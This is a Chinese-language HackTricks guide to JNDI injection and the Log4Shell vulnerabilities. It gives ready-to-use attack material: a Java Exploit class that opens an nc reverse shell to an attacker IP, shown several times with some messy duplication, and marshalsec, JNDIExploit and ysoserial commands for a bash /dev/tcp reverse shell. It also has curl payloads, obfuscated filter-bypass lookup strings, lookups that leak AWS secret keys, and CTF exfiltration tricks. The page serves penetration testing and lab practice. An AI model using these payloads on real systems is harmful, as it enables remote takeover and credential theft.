# JNDI - Java命名和目录接口 & Log4Shell

<details>

<summary><strong>从零开始学习AWS黑客攻击直至成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter**上**关注**我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到对您最重要的漏洞，以便更快修复它们。Intruder追踪您的攻击面，运行主动威胁扫描，在您的整个技术栈中找到问题，从API到Web应用程序和云系统。[**今天就免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 基本信息

JNDI自20世纪90年代末就存在于Java中。它是一种目录服务，**允许Java程序通过名称服务在目录中查找数据**。名称服务关联值（绑定），因此可以通过目录中的引用获取它。

JNDI有许多**服务提供商接口**（SPI），使其能够使用各种目录服务。JNDI的目标是非常容易地从其他系统获取数据。您甚至可以远程获取Java对象，这就是问题所在。

例如，存在**CORBA COS**（公共对象服务）、**Java RMI**（远程方法接口）注册表和**LDAP**的SPI。

![](<../../.gitbook/assets/image (627).png>)

### JNDI命名引用

为了检索Java对象，您可以序列化它们并保存二进制表示形式。但在某些情况下，这不起作用（可能是因为数据太大或其他任何事情）。\
为了更容易地保存Java对象，**使用命名引用**。\
有两种类型的命名引用：

* **引用地址**：这指示对象的地址（_rmi://server/ref_），然后**将从该地址检索对象**。
* **远程工厂**：在这种情况下，将在JNDI引用中指出一个**远程工厂类**，然后，按照JNDI地址，远程类将从远程工厂获取，并且**类将被下载和加载**。

这是危险的，因为**攻击者可能使系统加载任意对象并执行任意代码**，因此存在一些保护措施：

* **RMI**：`java.rmi.server.useCodeabseOnly = true` 默认自**JDK 7u21**起启用，否则它将允许远程加载自定义Java对象。此外，即使保护被禁用，也会强制执行**安全管理器**来配置可以加载什么。
* **LDAP**：`com.sun.jndi.ldap.object.trustURLCodebase = false` 默认自**JDK** **6u141, 7u131, 8u121**起启用，它不允许执行下载的任意Java对象。但如果设置为`true`，它将允许，并且**不会强制执行安全管理器**。
* **CORBA**：没有要配置的属性，但**安全管理器始终被强制执行**。

此外，**命名管理器**，即将遵循JNDI链接的管理器，没有任何安全管理器或要配置的属性，所以它将始终尝试获取对象。

正如您所看到的，**总体上的保护措施不足**，因为**没有防止从随机地址加载JNDI的保护**，并且RMI、LDAP和CORBA的保护可能被绕过（取决于配置），以**加载任意Java对象**或**加载Java对象**，这些对象将滥用应用程序中现有的组件作为**小工具来执行任意代码**。

URL示例以滥用JNDI：

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

### JNDI示例

![](<../../.gitbook/assets/image (655) (1) (1).png>)

即使您已设置**`PROVIDER_URL`**，您也可以在查找中指定不同的URL，它将被访问：`ctx.lookup("<attacker-controlled-url>")`，这就是攻击者将滥用的内容，以便从他控制的系统中加载任意对象。

### CORBA

**互操作对象引用（IOR）**是CORBA或RMI-IIOP引用，它唯一地标识远程CORBA服务器上的对象。IOR可以是二进制格式或二进制的字符串十六进制表示。\
除其他信息外，它包含**类型ID**（接口的唯一标识符）和**代码库**（用于获取存根类的远程位置）。\
请注意，**默认情况下CORBA不能被滥用**。\
它需要：

* 必须安装**安全管理器**
* 安全管理器必须允许连接到**攻击者控制的代码库**。允许此操作的方法有几种：
  * 套接字权限：`permissions java.net.SocketPermission "*:1098-1099", "connect";`
  * 允许读取所有文件的文件权限：`permission java.io.FilePermission "<<ALL FILES>>", "read";`
  * 允许读取攻击者可以上传漏洞利用工具（类或zip存档）的文件夹的文件权限

您可能会发现**供应商的策略默认允许这样做**。

### RMI

如前面**JNDI命名引用部分**所述，RMI默认不允许下载任意Java类。而且，即使它会，您还需要**绕过安全管理器策略**（在前一节中我们了解到这是可能的，使用CORBA）。

### LDAP

首先，我们需要区分搜索和查找。\
**搜索**将使用像`ldap://localhost:389/o=JNDITutorial`这样的URL从LDAP服务器查找JNDITutorial对象，并**检索其属性**。\
**查找**是为了**命名服务**，因为我们想要获取**绑定到名称的任何内容**。

如果LDAP搜索是用**SearchControls.setReturningObjFlag()** 和`true`调用的，那么返回的对象将被重建。

因此，有几种方法可以攻击这些选项。\
**攻击者可能会在LDAP记录中引入有效载荷**，这些有效载荷将在收集它们的系统中执行（如果您可以访问LDAP服务器，这非常有用，可以**危害数十台机器**）。另一种利用这个的方法是对LDAP搜索进行**MitM攻击**。

如果您可以**使应用程序解析JNDI LDAP URL**，您可以控制将被搜索的LDAP，并且您可以发送回漏洞利用工具（log4shell）。

#### 反序列化漏洞利用

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

**漏洞利用工具被序列化**，并将被反序列化。\
如果`trustURLCodebase`是`true`，攻击者可以提供他自己的类在代码库中，如果不是，他将需要滥用类路径中的小工具。

#### JNDI引用漏洞利用

使用**JavaFactory引用**攻击这个LDAP更容易：

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Log4Shell漏洞

漏洞是在Log4j中引入的，因为它支持一种[${prefix:name}](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)的[**特殊语法**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)，其中`prefix`是多种不同[**查找**](https://logging.apache.org/log4j/2.x/manual/lookups.html)之一，`name`应该被评估。例如，`${java:version}`是当前运行的Java版本。

在[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313)中添加了一个`jndi`查找，如下所述：“JndiLookup允许通过JNDI检索变量。默认情况下，键将以java:comp/env/为前缀，但如果键包含**":"，则不会添加前缀**。”

如果键中存在**:**，如`${jndi:ldap://example.com/a}`中的，就**没有前缀**，并且**LDAP服务器被查询对象**。这些查找可以用于Log4j的配置以及记录日志时。

因此，唯一需要的是让**易受攻击的Log4j版本处理用户控制的信息**。由于这是Java应用程序广泛使用的库，用于记录信息（包括面向Internet的应用程序），因此很常见的是，例如，Log4j记录接收到的HTTP头部信息，如User-Agent。然而，log4j**不仅用于记录HTTP信息，还用于记录开发人员指定的任何输入**和数据。

## Log4Shell CVEs

* [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[严重]**：原始的'Log4Shell'漏洞是一个[不受信任的反序列化](https://cwe.mitre.org/data/definitions/502.html)缺陷。在[CVSS](https://www.first.org/cvss/)量表上评为严重，这个漏洞得分为10，**授予未经认证的攻击者远程代码执行（RCE）能力**，允许完全接管系统。\
\
由阿里巴巴云安全团队的Chen Zhaojun于11月24日向Apache报告，CVE-2021-44228影响了多个Apache框架的默认配置，包括Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。\
\
作为最危险的漏洞，这个漏洞潜伏在[log4j-core](https://search.maven.org/artifact/org.apache.logging.log4j/log4j-core)组件中，仅限于2.x版本：从2.0-beta9到包括2.14.1。Log4Shell的修复版本在2.15.0中推出，但被认为不完整（继续阅读）。\
\
威胁情报分析师Florian Roth分享了Sigma规则 \[[1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)]，可以作为防御之一。\\
* [**CVE-2021-45046**](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) \[**严重**，之前为低级别]: 这是一个拒绝服务（DoS）漏洞，得分为~~3.7~~ 9.0。这个漏洞是由于CVE-2021-44228的**不完整修复**导致的，该修复在2.15.0中实施。虽然2.15.0的修复在很大程度上解决了漏洞，但对于某些**非默认配置**来说并非如此。\
\
Log4j 2.15.0尝试**默认限制JNDI LDAP查找到\_localhost**\_。但是，**攻击者**如果控制**线程上下文映射（MDC）**输入数据，可以通过JNDI查找模式制作恶意有效载荷来引发DoS攻击。这适用于非默认配置，其中非默认模式布局使用上下文查找，例如\$${ctx:loginId}，或线程上下文映射模式（%X、%mdc或%MDC）。\
\
从这个[**推文**](https://twitter.com/marcioalm/status/1471740771581652995)中获得的**绕过方法**是：\
_这是一个在Log4J 2.15.0中绕过allowedLdapHost和allowedClasses检查以实现RCE的PoC：**`${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`**，要绕过allowedClasses，只需为JDK中的一个类选择一个名称。反序列化将像往常一样发生。_\
\_\_\
\_\_"Log4j 2.16.0通过移除对消息查找模式的支持并默认禁用JNDI功能来解决这个问题，"NVD咨询声明。对于2.12.1分支上的人来说，修复被回溯到2.12.2。\\
* [**CVE-2021-4104**](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[高]**：我们说Log4j 2.x版本容易受到攻击了吗？那么**Log4j 1.x**呢？\
\
虽然之前被认为是安全的，但Log4Shell还是找到了潜伏在旧版Log4j中的方法。本质上，**Log4j 1.x实例的非默认配置使用\_JMSAppender**\_\*\*类也容易受到不受信任的反序列化缺陷的影响\*\*。\
\
尽管是CVE-2021-44228的较轻微变体，但这个CVE影响了所有版本的[log4j:log4j](https://search.maven.org/artifact/log4j/log4j)和[org.apache.log4j:log4j](https://mvnrepository.com/artifact/org.apache.log4j/log4j)组件，这些组件只存在1.x版本。由于这些是[终止生命周期](https://logging.apache.org/log4j/1.2/)版本，**1.x分支的修复在任何地方都不存在**，应该升级到_log4j-core_ 2.
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **验证**

一些之前列出的平台将允许您插入一些变量数据，当请求时会被记录。\
这对于两件事非常有用：

* 验证漏洞
* 利用漏洞泄露信息

例如，您可以请求类似：\
或者 `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** 如果接收到带有环境变量值的 **DNS请求**，您就知道应用程序是易受攻击的。

其他您可能尝试泄露的信息：
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE 信息

{% hint style="info" %}
运行在 **JDK 版本高于 6u141、7u131、8u121** 的主机将受到 LDAP 类加载向量的保护**但不包括反序列化向量**。这是因为 `com.sun.jndi.ldap.object.trustURLCodebase` 默认是禁用的，因此 JNDI 不能使用 LDAP 加载远程代码库。但我们必须强调反序列化和变量泄露仍然可能发生。\
这意味着要**利用上述版本**，你需要**滥用 Java 应用程序中存在的某些受信任小工具**（例如使用 ysoserial 或 JNDIExploit）。但要利用更低版本，你可以让它们加载并执行任意类（这使得攻击更容易）。

要获取**更多信息**（_如 RMI 和 CORBA 向量的限制_）**请查看前面的 JNDI 命名参考部分**或 [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - 使用自定义负载的 Marshalsec

_这个技巧完全来自 **THM 盒子：**_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)___

在这个漏洞中，将使用工具 [**marshalsec**](https://github.com/mbechler/marshalsec)（从这里下载 [**jar 版本**](https://github.com/RandomRobbieBF/marshalsec-jar)）来创建一个 LDAP referral 服务器，以将连接引导到我们的次级 HTTP 服务器，那里将提供漏洞利用：
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("nc -e /bin/sh attacker_ip 4444");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
{% endcode %}

我们希望受害者加载将向我们发送反向 shell 的代码，因此您可以创建一个名为 Exploit.java 的 java 文件，内容如下：

{% code title="" %}
```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("nc -e /bin/sh attacker_ip 4444");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
{% endcode %}
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
{% endcode %}

创建**类文件**执行：`javac Exploit.java -source 8 -target 8`，然后在创建类文件的同一目录下运行**HTTP服务器**：`python3 -m http.server`。\
**marshalsec的LDAP服务器应该指向这个HTTP服务器**。\
然后，您可以通过发送如下载荷，使**易受攻击的Web服务器执行exploit类**：
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
_请注意，如果 Java 没有配置为使用 LDAP 加载远程代码库，这个自定义漏洞利用将不起作用。在这种情况下，您需要滥用一个受信任的类来执行任意代码。_

### RCE - **JNDIExploit**

{% hint style="info" %}
请注意，出于某种原因，作者在发现 log4shell 后从 github 上删除了这个项目。您可以在 [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) 找到一个缓存版本，但如果您想尊重作者的决定，请使用不同的方法来利用这个漏洞。

此外，您在 wayback machine 中找不到源代码，所以要么分析源代码，要么在知道您不知道您正在执行什么的情况下执行 jar 文件。
{% endhint %}

在这个例子中，您可以在端口 8080 上运行这个**对 log4shell 漏洞的易受攻击的 web 服务器**：[https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)（_在 README 中您会找到如何运行它_）。这个易受攻击的应用程序正在使用一个易受攻击版本的 log4shell 记录 HTTP 请求头 _X-Api-Version_ 的内容。

然后，您可以下载 **JNDIExploit** jar 文件并执行它：
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
在阅读代码几分钟后，你可以在 _com.feihong.ldap.LdapServer_ 和 _com.feihong.ldap.HTTPServer_ 中看到**LDAP 和 HTTP 服务器是如何创建的**。LDAP 服务器将理解需要提供哪些有效载荷，并将受害者重定向到 HTTP 服务器，后者将提供漏洞利用程序。
在 _com.feihong.ldap.gadgets_ 中，你可以找到**一些特定的小工具**，这些工具可以用来执行所需的操作（潜在地执行任意代码）。而在 _com.feihong.ldap.template_ 中，你可以看到不同的模板类，这些类将**生成漏洞利用程序**。

你可以通过**`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`** 查看所有可用的漏洞利用程序。一些有用的包括：
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
因此，在我们的例子中，我们已经有了正在运行的docker易受攻击的应用程序。要攻击它：
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
在发送攻击时，您将在执行 **JNDIExploit-1.2-SNAPSHOT.jar** 的终端中看到一些输出。

**记得检查 `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` 以获取其他利用选项。此外，如果需要，您可以更改LDAP和HTTP服务器的端口。**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

与之前的漏洞利用类似，您可以尝试使用 [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) 来利用这个漏洞。\
您可以生成URL并发送给受害者，运行：
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_此攻击使用自定义生成的java对象在**THM solar room**等实验室中有效。然而，这通常不会起作用（因为默认情况下Java没有配置为使用LDAP加载远程代码库），我认为这是因为它没有滥用受信任的类来执行任意代码。_

### RCE - ysoserial & JNDI-Exploit-Kit

此选项对于攻击**仅信任指定类而不是所有类的Java版本**非常有用。因此，**ysoserial** 将被用来生成**受信任类的序列化**，这些序列化可以作为小工具来**执行任意代码**（_被ysoserial滥用的受信任类必须被受害者java程序使用，以便漏洞利用工作_）。

使用 **ysoserial** 或 [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) 你可以创建将由JNDI下载的反序列化漏洞利用：
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
使用 [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) 生成 **JNDI 链接**，在这些链接上，漏洞机器将等待连接。您可以提供 **不同的漏洞利用，这些可以由 JNDI-Exploit-Kit 自动生成**，甚至是您自己的 **反序列化有效载荷**（由您或 ysoserial 生成）。
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

现在，您可以轻松使用生成的JNDI链接来利用漏洞并通过向易受攻击的log4j版本发送以下内容来获取**反向 shell**：**`${ldap://10.10.14.10:1389/generated}`**

### 绕过
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ı}}:ldap://...} //Notice the unicode "i"
```
### 自动扫描器

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - 查找本地易受攻击的库

### 测试实验室

* [**LogForge HTB 机器**](https://app.hackthebox.com/tracks/UHC-track)
* [**尝试黑客攻击我 Solar 房间**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Post-Log4Shell 漏洞利用

在这个 [**CTF 写作**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) 中很好地解释了如何有可能**滥用** **Log4J** 的某些功能。

Log4j 的 [**安全页面**](https://logging.apache.org/log4j/2.x/security.html) 有一些有趣的句子：

> 从版本 2.16.0（适用于 Java 8）开始，**消息查找功能已被完全移除**。**配置中的查找仍然有效**。此外，Log4j 现在默认禁用对 JNDI 的访问。现在需要明确启用配置中的 JNDI 查找。

> 从版本 2.17.0（以及适用于 Java 7 和 Java 6 的 2.12.3 和 2.3.1）开始，**只有配置中的查找字符串会递归展开**；在任何其他用途中，只解析顶层查找，任何嵌套的查找都不会被解析。

这意味着默认情况下你可以**忘记使用任何 `jndi` 漏洞**。此外，要执行**递归查找**，你需要配置它们。

例如，在那个 CTF 中，这是在文件 log4j2.xml 中配置的：
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

在这个CTF中，攻击者控制了`${sys:cmd}`的值，并需要从环境变量中窃取flag。\
如[**先前的payloads**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification)页面所示，有几种不同的方法可以访问环境变量，例如：**`${env:FLAG}`**。在这个CTF中这是无用的，但在其他现实生活场景中可能不是。

### 异常中的数据窃取

在CTF中，你**无法访问**使用log4J的java应用程序的stderr，但是Log4J的**异常被发送到stdout**，这会在python应用程序中打印出来。这意味着触发一个异常我们可以访问内容。用于窃取flag的一个异常是：**`${java:${env:FLAG}}`.** 这有效是因为**`${java:CTF{blahblah}}`**不存在，且会显示带有flag值的异常：

![](<../../.gitbook/assets/image (157).png>)

### 转换模式异常

仅仅提一下，你也可以注入新的[**转换模式**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout)并触发将被记录到`stdout`的异常。例如：

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

这在错误消息中窃取数据时被发现不有用，因为lookup在转换模式之前没有被解决，但它可能对其他事情有用，比如检测。

### 转换模式正则表达式

然而，可以使用一些**支持正则表达式的转换模式**通过使用正则表达式和滥用**二进制搜索**或**基于时间的**行为来窃取lookup中的信息。

* **通过异常消息进行二进制搜索**

转换模式**`%replace`**可以用来**替换**来自**字符串**的**内容**，甚至使用**正则表达式**。它的工作原理如下：`replace{pattern}{regex}{substitution}`\
利用这种行为，你可以让replace在字符串内部的任何内容**匹配正则表达式时触发异常**（如果没有找到则不触发异常），如下所示：
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **基于时间**

如前一节所述，**`%replace`** 支持 **正则表达式**。因此，可以使用 [**ReDoS 页面**](../regular-expression-denial-of-service-redos.md) 上的 payload 来引起 **超时**，如果找到了标志。\
例如，像 `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` 这样的 payload 会在那个 CTF 中触发 **超时**。

在这篇 [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) 中，它没有使用 ReDoS 攻击，而是使用了 **放大攻击** 来引起响应时间的差异：

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> 如果标志以 `flagGuess` 开头，整个标志将被替换为 29 个 `#`（我使用这个字符是因为它可能不会是标志的一部分）。**然后，结果中的每个 29 个 `#` 被替换为 54 个 `#`**。这个过程重复 **6 次**，总共有 `29*54*54^6* =`` `` `**`96816014208`  `#`！**
>
> 替换这么多的 `#` 将触发 Flask 应用程序的 10 秒超时，这反过来将导致 HTTP 状态码 500 被发送给用户。（如果标志不是以 `flagGuess` 开头，我们将收到一个非 500 状态码）

## 参考资料

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到对您最重要的漏洞，以便更快修复。Intruder 跟踪您的攻击面，运行主动威胁扫描，在您的整个技术栈中找到问题，从 API 到 web 应用程序和云系统。[**今天就免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> 从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的 **公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
